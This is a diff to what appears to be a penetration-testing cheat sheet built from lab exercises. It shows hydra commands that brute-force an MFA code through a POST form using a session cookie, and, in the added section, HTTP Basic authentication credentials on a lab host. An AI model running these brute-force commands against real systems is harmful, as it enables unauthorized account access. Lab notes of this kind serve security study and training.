@@ -147,6 +147,20 @@ This example shows how to brute force a POST request. Check HackPark how to get 
 hydra -l $USERNAME -P output.txt $VICTIM http-post-form "/console/mfa.php:code=^PASS^:H=Cookie: PHPSESSID=hshqcs3n42r9qjs5b2850r9alt; user=jason_test_account; pwd=violet:F=Incorrect code" -T 64
 ```
 
+### Crack base64 encoded credentials
+
+#### Examples
+
+[enumeration-and-brute-force.md](enumeration-and-brute-force.md "mention")
+
+**Kali**
+
+```
+hydra -l $USERNAME -P $PASSWORDS.txt http-get:"//enum.thm/labs/basic_auth/:A:Basic" -V
+```
+
+
+
 ### **Credentials from Firefox**
 
 &#x20;**Examples**
